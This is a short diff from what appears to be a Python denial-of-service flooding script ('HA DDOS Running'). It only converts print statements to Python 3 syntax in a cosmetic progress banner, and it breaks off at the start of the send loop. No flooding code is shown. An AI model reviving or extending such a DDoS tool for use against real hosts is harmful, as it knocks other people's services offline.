@@ -28,15 +28,15 @@ port = input("Enter Port    : ")
 
 os.system("clear")
 os.system("figlet HA DDOS Running")
-print "[+]--                        [+]0% "
+print ("[+]--                        [+]0% ")
 time.sleep(2)
-print "[+]-xxxx>                    [+]25%"
+print ("[+]-xxxx>                    [+]25%")
 time.sleep(2)
-print "[+]-xxxxxxx>                 [+]50%"
+print ("[+]-xxxxxxx>                 [+]50%")
 time.sleep(3)
-print "[+]-xxxxxxxxx>               [+]75%"
+print ("[+]-xxxxxxxxx>               [+]75%")
 time.sleep(2)
-print "[+]-xxxxxxxxxxxxxx>          [+]100%"
+print ("[+]-xxxxxxxxxxxxxx>          [+]100%")
 time.sleep(2)
 sent = 0
 while True:
